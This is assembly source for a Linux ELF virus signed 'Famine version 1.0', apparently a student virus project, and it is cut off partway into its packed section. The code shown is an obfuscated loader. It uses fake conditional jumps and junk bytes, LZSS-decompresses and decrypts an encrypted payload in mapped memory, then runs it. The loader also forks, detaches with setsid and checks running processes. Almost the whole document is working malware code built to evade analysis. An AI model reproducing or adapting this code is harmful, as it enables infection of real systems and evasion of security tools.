; REGISTERS : %m6, %m7, %m8, %vsp
; Do not touch those registers as they contain sensitive data
; about different memory pages addresses.

%include "inc.asm"

DEFAULT rel
GLOBAL _start

SECTION .text

    nop
_start:
    nop
    call        _virus

align 16
_signature:
    .start: db "Famine version 1.0 (c)oded by mamaurai:xchalle - "
    .startsize: equ $-.start
    .index: times 4 db 0x30
    db 0x00
align 16
_eos:

;- GLOBAL variables ----------------------------------
signature_len: equ _eos-_signature
non_packed_len: equ _packed-_start
virus_len: dd 0x00000000
entrypoint: dq 0x0000000000000000
;-----------------------------------------------------
; PUBLIC PART (This part isn't encrypted or packed).
_public:
;-----------------------------------------------------
; Public Structures (Structures used by public
; functions).
struc _UEC_OFF
    .mapaddr    resq 0x1
endstruc
struc _LZSSD_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .length     resq 0x1
    .index      resd 0x1
    .bits_buf   resb 0x1
    .mask       resb 0x1
    .bits       resq 0x1
endstruc
;-----------------------------------------------------
; Public Preprocessor Values.
tracerline_size: equ 11
columns_size: equ 7
lines_size: equ 5
debugging_size: equ 23
original_virus_len: equ _eof-_start
;-----------------------------------------------------
; Public code.
;-----------------------------------------------------
_virus:
    jmp         ..@r0gDIqr9cRvj
..@391RZ9YOZGZy:
    jne         ..@oSiDRTpE5dg7
    add         rdi, bytes
    jmp         $+3
db 0x4f
    jmp         $+4
db 0xd0, 0xd1
    js          ..@hMCkxqsFdrke
    jns         ..@hMCkxqsFdrke
..@tn691i0ShBFG:
    xor         r1, r1
    jmp         $+5
db 0xa4, 0x7d, 0xa6
    jmp         $+3
db 0x3c
    js          ..@0GnnuxXr3Nt6
    jns         ..@0GnnuxXr3Nt6
..@T0T751gPWRVf:
    call        ExitProgram
    jmp         $+4
db 0x63, 0xaf
    jmp         $+4
db 0x65, 0x58
    js          ..@50gqcEaftzC8
    jns         ..@50gqcEaftzC8
..@PiVOeoxVxlYk:
    test        rax, rax
    jmp         $+4
db 0xb5, 0x70
    jmp         ..@8A2c9a4WJauv
..@0GnnuxXr3Nt6:
    xor         r2, r2
    xor         r3, r3
    jmp         $+5
db 0xc7, 0x4d, 0x8d
    jl          ..@n6FNwlNpWRyV
    jge         ..@n6FNwlNpWRyV
..@UlADe1h8Fyln:
%ifdef X86_64
    mov         eax, SYS_MMAP
%endif
    jb          ..@JzTS1UCroSOu
    jae         ..@JzTS1UCroSOu
..@hheCiYhqg3pC:
    add         rsp, _LZSSD_OFF_size
    ret
    jmp         $+5
db 0xc9, 0xc5, 0x99
..@CB36n3iMEuzJ:
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    jb          ..@EzTh4GIh8ObX
    jae         ..@EzTh4GIh8ObX
..@4pIVG3CqZ2ce:
    inc         QWORD [rsp+_LZSSD_OFF.inputaddr]
    jl          ..@G4cinLbzXXey
    jge         ..@G4cinLbzXXey
..@T1DnZp3ZngAk:
    sub         rsp, _UEC_OFF_size
    xor         rax, rax
    js          ..@tn691i0ShBFG
    jns         ..@tn691i0ShBFG
..@TGGfaNGh821m:
%ifdef X86_64
    mov         edx, 111b
    mov         r10, 0x22
%endif
    jl          ..@qKHZ5lFCKlss
    jge         ..@qKHZ5lFCKlss
..@v4YYpXSQGUCq:
    pop         r3
    pop         r2
    pop         r1
    jmp         $+5
db 0x8b, 0x61, 0x07
    jmp         $+5
db 0x02, 0xd2, 0xee
    js          ..@6GrEYEyRIWz5
    jns         ..@6GrEYEyRIWz5
..@BchobFBkiwIY:
    xor         rax, rax
    jl          ..@inpU0Cy9pevQ
    jge         ..@inpU0Cy9pevQ
..@8A2c9a4WJauv:
    jz          ..@LHwyxpMeR7Zx
    jmp         $+5
db 0xee, 0x5b, 0x10
    jmp         $+3
db 0xf9
    jmp         ..@OpPLbx4due0d
..@kpHAguFzCBv7:
    call        ..@76paBJYM05uU
    jmp         $+4
db 0x73, 0xa7
    jmp         ..@0HlROIOD44kS
..@qrou1xWvUf1o:
    mov         QWORD [rsp+_LZSSD_OFF.inputaddr], r1
    jmp         $+4
db 0x5b, 0x8c
    js          ..@lJiA9XcyMQsO
    jns         ..@lJiA9XcyMQsO
..@9SqfrsVzc4WE:
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    je          ..@h5T7G3SbaIup
    jne         ..@h5T7G3SbaIup
..@o21ZpaPkBK7b:
%ifdef X86_32
    int         0x80
%endif
    jb          ..@9noMeqIVjlWi
    jae         ..@9noMeqIVjlWi
..@OV0i95vCuDhA:
    mov         BYTE [rsp+_LZSSD_OFF.mask], 10000000b
    js          ..@FuyouaQBd2tQ
    jns         ..@FuyouaQBd2tQ
..@2B4SpDxRaXso:
    mov         rax, r2
    pop         r1
    jmp         $+5
db 0xff, 0x35, 0xc3
    jmp         $+4
db 0x0f, 0xc5
    jmp         ..@RCdKhBBjMD9B
..@NOJp2IcNXlVG:
    mov         QWORD [rsp+_LZSSD_OFF.length], r2
    jmp         ..@8dnFZxvIEbSN
..@2hQZH8Wu3bgP:
    xor         rdi, rdi
    js          ..@T0T751gPWRVf
    jns         ..@T0T751gPWRVf
..@CCwhRtr2Mg6C:
    mov         dl, BYTE [rbx]
    mov         BYTE [rsp+_LZSSD_OFF.bits_buf], dl
    jmp         $+4
db 0x97, 0x70
    jl          ..@4pIVG3CqZ2ce
    jge         ..@4pIVG3CqZ2ce
..@Gx2w50H4oqUB:
    jz          ..@2B4SpDxRaXso
    js          ..@fVslIyb9VKg1
    jns         ..@fVslIyb9VKg1
..@5Fiadffoclzw:
    add         r1, 1
    add         r2, 1
    dec         r3
    jmp         $+5
db 0x1e, 0x13, 0xbc
    jl          ..@7xZ6mvbr8IPl
    jge         ..@7xZ6mvbr8IPl
..@snFNG3x2MNBs:
    ret
    jb          Strncmp
    jae         Strncmp
..@qKHZ5lFCKlss:
%ifdef X86_64
    mov         r8, 0xffffffffffffffff
%endif
    jmp         ..@UlADe1h8Fyln
..@1ZlGUmYQVjez:
    add         rsp, bytes
    jmp         $+5
db 0x11, 0xde, 0xbb
    jb          ..@3U8gkervwhEF
    jae         ..@3U8gkervwhEF
..@9Jahm1UJvrN2:
    jle         ..@Wnj8i95tyGAp
    jmp         $+3
db 0x58
    jmp         $+4
db 0xb7, 0x6f
    js          ..@9FqE0GdV8UAO
    jns         ..@9FqE0GdV8UAO
..@UcS7fJW0mstk:
    jz          ..@uk6OXB2SBpFN
    or          eax, 1
    js          ..@uk6OXB2SBpFN
    jns         ..@uk6OXB2SBpFN
..@EcyoeV2LaVTo:
    add         ecx, 1
    jb          ..@VuthG0gSaeGF
    jae         ..@VuthG0gSaeGF
..@LHwyxpMeR7Zx:
    mov         rcx, POSITION_BITS
    js          ..@kpHAguFzCBv7
    jns         ..@kpHAguFzCBv7
..@fx7mOsK4d7Yb:
    syscall
    jmp         $+3
db 0x41
    jmp         ..@JXk69gW0leam
..@ePZRE3ctYUfo:
    xor         r2, r2
    jmp         ..@2B4SpDxRaXso
..@n6FNwlNpWRyV:
%ifdef X86_32
    mov         ecx, original_virus_len-non_packed_len
%endif
    js          ..@nQBpl4tW88s4
    jns         ..@nQBpl4tW88s4
..@8kaXbdaHQBaN:
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    js          ..@MZpJFOx61Vst
    jns         ..@MZpJFOx61Vst
..@KwDMdNiNVTqc:
    cmp         BYTE [r1 + rax], 0x0
    jz          ..@snFNG3x2MNBs
    add         rax, 1
    jmp         ..@yoDURKMmHX6s
..@ugQ041YSStf7:
    jmp         ..@9FqE0GdV8UAO
    jmp         $+3
db 0x2d
    jmp         $+5
db 0x51, 0x39, 0xc9
    jmp         ..@LHwyxpMeR7Zx
..@ertdKkVTCL71:
    inc         DWORD [rsp+_LZSSD_OFF.index]
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    jmp         $+3
db 0x26
    jmp         $+3
db 0x97
    jmp         ..@EcyoeV2LaVTo
..@7xZ6mvbr8IPl:
    jnz         ..@jEWlco211Kmc
    xor         rax, rax
    jb          ..@v4YYpXSQGUCq
    jae         ..@v4YYpXSQGUCq
..@7FFDGcmAZYFH:
    test        eax, eax
    jz          ..@BchobFBkiwIY
    jmp         $+5
db 0x29, 0xbe, 0x60
    jb          ..@FTXf60hqImBg
    jae         ..@FTXf60hqImBg
..@9VlYsiqxTOcC:
    xor         r4, r4
    jmp         $+5
db 0x03, 0x72, 0xe7
    jmp         ..@g3BgTJ1FoCPU
..@Iiz8PPSqNCn4:
    DESTROY_MX_VAR
    mov         rax, r1
    jmp         $+4
db 0x71, 0x8a
    jmp         ..@YhnMjAvOPPxK
..@cTp4sQj6TQlh:
    mov         rbx, QWORD [rsp+_LZSSD_OFF.inputaddr]
    jmp         ..@CCwhRtr2Mg6C
..@YhnMjAvOPPxK:
    xor         r1, r1
    jb          ..@5lXhlKT10Q7N
    jae         ..@5lXhlKT10Q7N
..@eSn0YOr0ADzH:
    xor         rax, rax
    jmp         $+4
db 0x26, 0x2b
    jmp         ..@4dcfBbrp1cpX
..@27DsDKXoqq3X:
    call        ExitProgram
    jl          LzssDecoder
    jge         LzssDecoder
..@oSiDRTpE5dg7:
    add         rdi, bytes
    cmp         QWORD [rdi], 0x00
    jmp         $+5
db 0x76, 0x07, 0xc3
    jl          ..@391RZ9YOZGZy
    jge         ..@391RZ9YOZGZy
..@DUVWxKr2OhbZ:
    xor         rax, rax
    jmp         ..@y9vyCqT3RDU9
..@BUY3X6OvIHWf:
    mov         r4, m4
    je          ..@pAAacqsJTbFb
    jne         ..@pAAacqsJTbFb
..@0RR24FZ0r59f:
    syscall
    jb          ..@bYJFgfbCLRJF
    jae         ..@bYJFgfbCLRJF
..@Wnj8i95tyGAp:
    mov         rbx, rsi
    jmp         $+4
db 0x67, 0x00
    jmp         $+5
db 0x02, 0xa8, 0x33
    jmp         $+3
db 0x63
    jmp         $+3
db 0x24
    jb          ..@fnbJyD1SyiZe
    jae         ..@fnbJyD1SyiZe
..@jEWlco211Kmc:
    mov         al, BYTE [r1]
    jmp         $+4
db 0x27, 0x2c
    js          ..@q3CMWGvDVPx7
    jns         ..@q3CMWGvDVPx7
..@4dcfBbrp1cpX:
    mov         r1, QWORD [rsp+_UEC_OFF.mapaddr]
    jmp         $+3
db 0x2c
    je          ..@yeY9qVQdgAOM
    jne         ..@yeY9qVQdgAOM
..@rAlTbOlMW1tV:
    push        rdi
    jmp         ..@BnPNeYaVgLyI
..@fr7wR2rprE9Q:
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    mov         BYTE [rbx], al
    jb          ..@CB36n3iMEuzJ
    jae         ..@CB36n3iMEuzJ
..@4L3Mca2PiAyK:
    mov         r2, QWORD [r4]
    test        r2, r2
    je          ..@yqbSPr3g6n6q
    jne         ..@yqbSPr3g6n6q
..@XHoi713RCr9E:
    jnz         ..@a2mwhNWfUPbe
    js          ..@rAlTbOlMW1tV
    jns         ..@rAlTbOlMW1tV
..@Bz8BJsl8CuBG:
    sub         al, BYTE [r2]
    jl          ..@YIAD9xc0zoMV
    jge         ..@YIAD9xc0zoMV
..@74JTVCrqa8ea:
    mov         rcx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    jl          ..@rBq5nIQsNkLq
    jge         ..@rBq5nIQsNkLq
..@vervCnxwLSrN:
    jmp         ..@hheCiYhqg3pC
    je          ..@76paBJYM05uU
    jne         ..@76paBJYM05uU
Strlen:
    jmp         ..@mMRpexlbYf9s
..@5IdyUPGYYIHC:
    mov         r2d, DWORD [r5]
    sub         r2, non_packed_len
    mov         r3, QWORD [rsp+_UEC_OFF.mapaddr]
    jmp         ..@NJMAiHbHhyz7
..@9r2V5CeTHEQt:
    cmp         DWORD [r5], 0x00000000
    jmp         $+5
db 0x25, 0xfa, 0xec
    jb          ..@fC1ZdFPMMaeG
    jae         ..@fC1ZdFPMMaeG
..@0Jc0zXdESeAV:
    jmp         ..@pAAacqsJTbFb
    jmp         $+5
db 0x53, 0xcd, 0xfd
    jmp         $+5
db 0xea, 0xfb, 0x78
    je          ..@ePZRE3ctYUfo
    jne         ..@ePZRE3ctYUfo
..@oCsVAsbudayB:
    call        rax
    jl          ..@eSn0YOr0ADzH
    jge         ..@eSn0YOr0ADzH
..@nQBpl4tW88s4:
%ifdef X86_32
    mov         edx, 111b
%endif
    jmp         $+5
db 0xe9, 0x8c, 0xd2
    jmp         $+3
db 0xfb
    jb          ..@rFtMgqrnmnbs
    jae         ..@rFtMgqrnmnbs
..@8CdNR3E4FGer:
    xor         r1, r1
    call        ExitProgram
    jmp         ..@T1DnZp3ZngAk
..@Xis7uspxTRcc:
    mov         rax, SYS_MUNMAP
    jb          ..@0RR24FZ0r59f
    jae         ..@0RR24FZ0r59f
..@zycdyJw78yaB:
    GGLOBAL     _packed
    mov         m8, r5 
    call        Processes
    jmp         $+3
db 0x56
    jmp         $+4
db 0x9a, 0xb9
    js          ..@8CdNR3E4FGer
    jns         ..@8CdNR3E4FGer
..@rZAn2L9qp1Ci:
    sub         rdi, 1
    sub         rdi, 0x5
    jb          ..@8AKGkOKZO1ne
    jae         ..@8AKGkOKZO1ne
..@SSGpHHxKQxjx:
    xor         r1, r1
    xor         r2, r2
    xor         r3, r3
    jmp         ..@4HJdVqZADlvA
..@CjXYWpjIY8x9:
    jg          ..@PiVOeoxVxlYk
    jmp         $+3
db 0x63
    jmp         $+3
db 0x79
    jmp         ..@vervCnxwLSrN
..@G4cinLbzXXey:
    dec         QWORD [rsp+_LZSSD_OFF.length]
    jb          ..@OV0i95vCuDhA
    jae         ..@OV0i95vCuDhA
..@6bYgXjuKjvrW:
%ifdef X86_64
    xor         r9, r9
    mov         esi, original_virus_len-non_packed_len
%endif
    jb          ..@TGGfaNGh821m
    jae         ..@TGGfaNGh821m
..@BKpKKeixGG8O:
    syscall
    js          ..@1ZlGUmYQVjez
    jns         ..@1ZlGUmYQVjez
..@FuyouaQBd2tQ:
    shl         eax, 1
    jmp         $+3
db 0x48
    jmp         ..@u0ppDXxSPuEJ
..@g3BgTJ1FoCPU:
    xor         r5, r5
    jmp         rax
    jmp         ..@BchobFBkiwIY
..@NCtdPXdVnShJ:
    push        r1
    jmp         $+3
db 0x11
    jl          ..@gdly9i1BAVO1
    jge         ..@gdly9i1BAVO1
..@ebYBAlQNEx3K:
    xor         r4, r4
    js          ..@vkBEUMs9eHVD
    jns         ..@vkBEUMs9eHVD
..@inpU0Cy9pevQ:
    mov         eax, SYS_SETSID
    syscall
    xor         rax, rax
    jmp         $+4
db 0x67, 0x4e
    jmp         $+5
db 0x87, 0x63, 0x2d
    jb          ..@r7Aa1Q8eWchz
    jae         ..@r7Aa1Q8eWchz
..@a2mwhNWfUPbe:
    cmp         BYTE [rsp+_LZSSD_OFF.mask], 0x00
    js          ..@vDIkUTV2VFzC
    jns         ..@vDIkUTV2VFzC
..@k7BIwRMOd0gL:
    GGLOBAL     virus_len
    jmp         ..@9r2V5CeTHEQt
..@NJMAiHbHhyz7:
    call        LzssDecoder
    jmp         $+4
db 0x36, 0x6c
    jmp         $+5
db 0x59, 0x2d, 0x99
    jmp         $+3
db 0x5f
    jmp         $+3
db 0x52
    jmp         $+3
db 0x1d
    jl          ..@knz6Y6UcO5aq
    jge         ..@knz6Y6UcO5aq
..@vX96MhINpTF2:
    sub         rsp, _LZSSD_OFF_size
    jmp         $+5
db 0x5b, 0x97, 0x73
    jl          ..@qrou1xWvUf1o
    jge         ..@qrou1xWvUf1o
..@T0kyhOwjq2Pa:
    VAR         public, entrypoint
    jl          ..@eGUbvioFc0mo
    jge         ..@eGUbvioFc0mo
..@n8IX09HtrNHO:
    sub         rcx, 1
    jmp         $+5
db 0xbf, 0xff, 0xf9
    jmp         $+5
db 0x93, 0x9e, 0x01
    je          ..@XHoi713RCr9E
    jne         ..@XHoi713RCr9E
..@BnPNeYaVgLyI:
    ret
    jmp         ..@hheCiYhqg3pC
..@0HlROIOD44kS:
    mov         rsi, rax 
    jmp         $+3
db 0x71
    jmp         ..@B2lwm2lUp0eT
..@al6PnG8tOQ78:
    mov         rdi, rbp
    jmp         $+3
db 0x95
    jl          ..@oSiDRTpE5dg7
    jge         ..@oSiDRTpE5dg7
DecryptExecutableCode:
    jmp         ..@k7BIwRMOd0gL
..@knz6Y6UcO5aq:
    mov         rax, QWORD [rsp+_UEC_OFF.mapaddr]
    mov         m8, rax
    jmp         $+4
db 0x0c, 0xe3
    jmp         ..@oCsVAsbudayB
..@mMRpexlbYf9s:
    xor         rax, rax
    jl          ..@KwDMdNiNVTqc
    jge         ..@KwDMdNiNVTqc
..@B2lwm2lUp0eT:
    mov         rcx, LENGTH_BITS
    call        ..@76paBJYM05uU
    add         rax, 1
    js          ..@utS42NB1cuSz
    jns         ..@utS42NB1cuSz
..@q3CMWGvDVPx7:
    cmp         BYTE [r2], al
    je          ..@5Fiadffoclzw
    jmp         $+5
db 0xb7, 0x9a, 0xd2
    jmp         $+5
db 0x1d, 0x18, 0x4c
    jmp         ..@Bz8BJsl8CuBG
..@aSOiQmptMl9O:
    GGLOBAL     virus_len
    xor         r2, r2
    jmp         $+3
db 0xb8
    jmp         ..@5IdyUPGYYIHC
..@JzTS1UCroSOu:
%ifdef X86_64
    syscall
%endif
    js          ..@Db4YMuOpfY0K
    jns         ..@Db4YMuOpfY0K
..@eGUbvioFc0mo:
    sub         r1, QWORD [r5]
    jb          ..@Iiz8PPSqNCn4
    jae         ..@Iiz8PPSqNCn4
..@9FqE0GdV8UAO:
    mov         rcx, 1
    call        ..@76paBJYM05uU
    jmp         ..@olRhbnjk2Yw2
..@5lXhlKT10Q7N:
    xor         r2, r2
    js          ..@nXDAhyFDf0aP
    jns         ..@nXDAhyFDf0aP
..@y9vyCqT3RDU9:
    xor         rdx, rdx
    jmp         ..@v2nHSMngqGAl
..@OpPLbx4due0d:
    mov         rcx, 8
    call        ..@76paBJYM05uU
    xor         rdi, rdi
    jl          ..@fr7wR2rprE9Q
    jge         ..@fr7wR2rprE9Q
..@vkBEUMs9eHVD:
    mov         rax, SYS_WAIT4
    jmp         $+3
db 0x5f
    jl          ..@BKpKKeixGG8O
    jge         ..@BKpKKeixGG8O
..@rFtMgqrnmnbs:
%ifdef X86_32
    mov         esi, 0x22
%endif
    js          ..@xbxMRoiDDr2y
    jns         ..@xbxMRoiDDr2y
..@8dnFZxvIEbSN:
    mov         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
    jmp         $+3
db 0x9b
    jmp         $+5
db 0xd3, 0xa9, 0x7f
    jmp         $+3
db 0x7b
    jl          ..@74JTVCrqa8ea
    jge         ..@74JTVCrqa8ea
..@JXk69gW0leam:
    test        eax, eax
    jz          ..@50gqcEaftzC8
    jl          ..@2hQZH8Wu3bgP
    jge         ..@2hQZH8Wu3bgP
..@mI4KOw9kiGXS:
    syscall
    cmp         eax, 0x0
    jl          ..@FTXf60hqImBg
    jmp         ..@7FFDGcmAZYFH
..@EzTh4GIh8ObX:
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    jmp         $+5
db 0xce, 0x28, 0x39
    jmp         $+4
db 0xc8, 0x4b
    jmp         ..@OQLDfUerdfvQ
..@RCdKhBBjMD9B:
    ret
    je          DecryptExecutableCode
    jne         DecryptExecutableCode
..@4HJdVqZADlvA:
    xor         r4, r4
    GGLOBAL     entrypoint
    js          ..@cnPDc7r2a7sp
    jns         ..@cnPDc7r2a7sp
..@bYJFgfbCLRJF:
    sub         rsp, _UEC_OFF_size
    jmp         $+3
db 0xfe
    jb          ..@27DsDKXoqq3X
    jae         ..@27DsDKXoqq3X
..@nXDAhyFDf0aP:
    xor         r3, r3
    jb          ..@9VlYsiqxTOcC
    jae         ..@9VlYsiqxTOcC
LzssDecoder:
    jmp         ..@vX96MhINpTF2
..@VuthG0gSaeGF:
    cmp         cl, dl
    js          ..@9Jahm1UJvrN2
    jns         ..@9Jahm1UJvrN2
..@RFKlaWbZHhV3:
    push        r1
    push        r2
    push        r3
    jmp         $+5
db 0x77, 0xb9, 0x85
    jmp         ..@s3nrmzInVS6Z
..@utS42NB1cuSz:
    mov         rdx, rax
    jl          ..@DpAHtui2wTwh
    jge         ..@DpAHtui2wTwh
..@gdly9i1BAVO1:
    call        Strlen
    mov         r3, rax
    jmp         $+4
db 0xbc, 0x69
    jmp         $+4
db 0xca, 0x8a
    jmp         $+4
db 0xc5, 0x07
    jmp         $+3
db 0x33
    jmp         $+5
db 0x6f, 0xf7, 0x08
    jmp         $+3
db 0x7b
    jl          ..@BUY3X6OvIHWf
    jge         ..@BUY3X6OvIHWf
..@Mn7mkqko83Pb:
    xor         rax, rax
    mov         rax, SYS_FORK
    jmp         $+3
db 0xe5
    jmp         ..@mI4KOw9kiGXS
..@fnbJyD1SyiZe:
    add         bx, cx
    and         bx, WINDOW_LENGTH-1
    jmp         ..@reXosgbzWP2q
..@mZXu2fHUV5Vx:
    cmp         QWORD [rsp+_LZSSD_OFF.length], 0x00
    jmp         $+5
db 0x13, 0xdd, 0xa5
    jmp         $+4
db 0x87, 0x66
    jmp         $+3
db 0xd3
    jl          ..@CjXYWpjIY8x9
    jge         ..@CjXYWpjIY8x9
..@3U8gkervwhEF:
    VAR         public, _start
    jmp         $+3
db 0x1a
    jb          ..@JwCZCIxDrhRK
    jae         ..@JwCZCIxDrhRK
..@i6kO4YA12IVy:
    mov         rax, SYS_EXIT
    jb          ..@wduaMhpK2gAO
    jae         ..@wduaMhpK2gAO
..@r7Aa1Q8eWchz:
    mov         rax, SYS_FORK
    jmp         $+3
db 0x6e
    js          ..@fx7mOsK4d7Yb
    jns         ..@fx7mOsK4d7Yb
..@s3nrmzInVS6Z:
    xor         rax, rax
    js          ..@jEWlco211Kmc
    jns         ..@jEWlco211Kmc
..@olRhbnjk2Yw2:
    mov         QWORD [rsp+_LZSSD_OFF.bits], rax
    jmp         $+4
db 0xa4, 0x2c
    jb          ..@mZXu2fHUV5Vx
    jae         ..@mZXu2fHUV5Vx
..@wBeUJI5gW0aS:
    jmp         ..@9FqE0GdV8UAO
    js          ..@PiVOeoxVxlYk
    jns         ..@PiVOeoxVxlYk
Strncmp:
    jmp         ..@RFKlaWbZHhV3
..@uk6OXB2SBpFN:
    shr         BYTE [rsp+_LZSSD_OFF.mask], 1
    jmp         ..@n8IX09HtrNHO
..@h5T7G3SbaIup:
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    jmp         $+3
db 0x02
    jmp         $+5
db 0x42, 0x98, 0x51
    jl          ..@ertdKkVTCL71
    jge         ..@ertdKkVTCL71
..@694jf51CnRuR:
    mov         r1, r5
    jmp         $+4
db 0x45, 0x21
    jmp         $+4
db 0x63, 0x9f
    jmp         $+5
db 0x33, 0x80, 0x63
    jmp         $+4
db 0xfa, 0x16
    jl          ..@aSOiQmptMl9O
    jge         ..@aSOiQmptMl9O
..@hMCkxqsFdrke:
    mov         m4, rdi
    jmp         $+4
db 0xcd, 0x55
    jmp         ..@SSGpHHxKQxjx
..@jdkvWkCkjgPl:
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    jmp         $+4
db 0x07, 0xdc
    jmp         ..@ugQ041YSStf7
ExitProgram:
    jmp         ..@yNtrM3yRl1Z1
..@DpAHtui2wTwh:
    xor         rax, rax
    jmp         $+5
db 0x85, 0x0b, 0xfc
    js          ..@Tf9IfolXfBci
    jns         ..@Tf9IfolXfBci
..@OQLDfUerdfvQ:
    inc         DWORD [rsp+_LZSSD_OFF.index]
    jmp         $+5
db 0xab, 0x09, 0x59
    jb          ..@jdkvWkCkjgPl
    jae         ..@jdkvWkCkjgPl
..@wduaMhpK2gAO:
    syscall
    jmp         $+3
db 0xdf
    jmp         Strlen
..@penR4g8tDHeF:
    mov         vsp, rdi
    jmp         $+3
db 0x10
    jmp         $+5
db 0x60, 0x4f, 0xbb
    jmp         ..@al6PnG8tOQ78
..@pAAacqsJTbFb:
    mov         r1, QWORD [rsp]
    jmp         $+3
db 0x1c
    jl          ..@4L3Mca2PiAyK
    jge         ..@4L3Mca2PiAyK
..@cnPDc7r2a7sp:
    cmp         QWORD [r5], 0x0000000000000000
    je          ..@50gqcEaftzC8
    jmp         $+4
db 0xae, 0x03
    js          ..@Mn7mkqko83Pb
    jns         ..@Mn7mkqko83Pb
..@tvV11N5qayCG:
%ifdef X86_32
    xor         ebp, ebp
    mov         eax, SYS_MMAP2
%endif
    jmp         $+3
db 0xca
    jl          ..@o21ZpaPkBK7b
    jge         ..@o21ZpaPkBK7b
..@xbxMRoiDDr2y:
%ifdef X86_32
    mov         edi, 0xffffffff
    push        ebp
%endif
    jmp         ..@tvV11N5qayCG
..@yeY9qVQdgAOM:
    mov         r2, original_virus_len-non_packed_len
    jmp         $+5
db 0xdf, 0xab, 0x77
    js          ..@Xis7uspxTRcc
    jns         ..@Xis7uspxTRcc
..@fVslIyb9VKg1:
    add         r4, bytes
    jmp         $+4
db 0x35, 0x9e
    jmp         $+4
db 0x6d, 0x04
    jb          ..@0Jc0zXdESeAV
    jae         ..@0Jc0zXdESeAV
..@8AKGkOKZO1ne:
    INIT_MX_VAR
    jmp         ..@penR4g8tDHeF
..@76paBJYM05uU:
    pop         rdi
    js          ..@DUVWxKr2OhbZ
    jns         ..@DUVWxKr2OhbZ
..@JwCZCIxDrhRK:
    mov         r1, r5
    jmp         $+3
db 0x04
    js          ..@T0kyhOwjq2Pa
    jns         ..@T0kyhOwjq2Pa
..@50gqcEaftzC8:
    jmp         DecryptExecutableCode
    jmp         $+4
db 0xa8, 0xf8
    js          ExitProgram
    jns         ExitProgram
..@rBq5nIQsNkLq:
    lea         rdi, QWORD [rsp+_LZSSD_OFF.buffer] 
    mov         rax, 0x20
    rep         stosb
    jl          ..@wBeUJI5gW0aS
    jge         ..@wBeUJI5gW0aS
..@XiQkgBXx80P9:
    GGLOBAL     _packed
    js          ..@694jf51CnRuR
    jns         ..@694jf51CnRuR
..@yoDURKMmHX6s:
    jmp         ..@KwDMdNiNVTqc
    jb          ..@snFNG3x2MNBs
    jae         ..@snFNG3x2MNBs
..@MZpJFOx61Vst:
    xor         rdi, rdi
    jmp         ..@9SqfrsVzc4WE
..@fC1ZdFPMMaeG:
    jne         ..@T1DnZp3ZngAk
    jmp         ..@zycdyJw78yaB
..@vDIkUTV2VFzC:
    jnz         ..@FuyouaQBd2tQ
    jmp         $+5
db 0x87, 0xb5, 0xac
    jmp         $+3
db 0x42
    jb          ..@cTp4sQj6TQlh
    jae         ..@cTp4sQj6TQlh
..@9noMeqIVjlWi:
%ifdef X86_32
    pop         ebp
%endif
    jmp         $+4
db 0x95, 0x03
    jb          ..@6bYgXjuKjvrW
    jae         ..@6bYgXjuKjvrW
..@u0ppDXxSPuEJ:
    mov         dl, BYTE [rsp+_LZSSD_OFF.bits_buf]
    and         dl, BYTE [rsp+_LZSSD_OFF.mask]
    test        dl, dl
    jmp         ..@UcS7fJW0mstk
..@reXosgbzWP2q:
    mov         al, BYTE [rsp+_LZSSD_OFF.buffer+rbx]
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    mov         BYTE [rbx], al
    jmp         ..@8kaXbdaHQBaN
..@6GrEYEyRIWz5:
    ret
    jmp         $+5
db 0xbd, 0x0c, 0x0b
    jmp         GetEnv
..@yNtrM3yRl1Z1:
    DESTROY_MX_VAR
    jmp         ..@i6kO4YA12IVy
GetEnv:
    jmp         ..@NCtdPXdVnShJ
..@Db4YMuOpfY0K:
    mov         QWORD [rsp+_UEC_OFF.mapaddr], rax
    js          ..@XiQkgBXx80P9
    jns         ..@XiQkgBXx80P9
..@lJiA9XcyMQsO:
    mov         QWORD [rsp+_LZSSD_OFF.outputaddr], r3
    mov         BYTE [rsp+_LZSSD_OFF.mask], 0x0
    jmp         ..@NOJp2IcNXlVG
..@tZlWWhfa2gvd:
    test        rax, rax
    jmp         $+3
db 0x4b
    jb          ..@Gx2w50H4oqUB
    jae         ..@Gx2w50H4oqUB
..@r0gDIqr9cRvj:
    pop         rdi
    js          ..@rZAn2L9qp1Ci
    jns         ..@rZAn2L9qp1Ci
..@YIAD9xc0zoMV:
    jmp         ..@v4YYpXSQGUCq
    jb          ..@5Fiadffoclzw
    jae         ..@5Fiadffoclzw
..@yqbSPr3g6n6q:
    jz          ..@ePZRE3ctYUfo
    call        Strncmp
    jmp         $+5
db 0xe1, 0xc1, 0x49
    jmp         $+3
db 0x8c
    je          ..@tZlWWhfa2gvd
    jne         ..@tZlWWhfa2gvd
..@FTXf60hqImBg:
    mov         r1, rax
    xor         r2, r2
    xor         r3, r3
    jmp         $+3
db 0x5f
    jmp         $+5
db 0xdb, 0x6d, 0xe0
    jmp         $+5
db 0xeb, 0x0a, 0x65
    jmp         $+4
db 0xa6, 0xc5
    jmp         ..@ebYBAlQNEx3K
..@v2nHSMngqGAl:
    xor         rbx, rbx
    jmp         ..@a2mwhNWfUPbe
..@Tf9IfolXfBci:
    xor         rcx, rcx
    xor         rdi, rdi
    jmp         ..@Wnj8i95tyGAp

;-----------------------------------------------------
; PACKED & ENCRYPTED PART (This part of the code is 
; packed with LZSS then encrpyted and is executed in 
; a mapped zone).
_packed:
    jmp         Processes
;-----------------------------------------------------
; Packed & Encrypted structures.
struc _PROC_OFF
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x100
    .filefd     resd 0x1
endstruc
struc _NBF_OFF
    .index      resw 0x1
    .file       resq 0x1
    .key        resb 0x20
endstruc
struc _PAYLOAD_OFF
    .key        resb 0x20
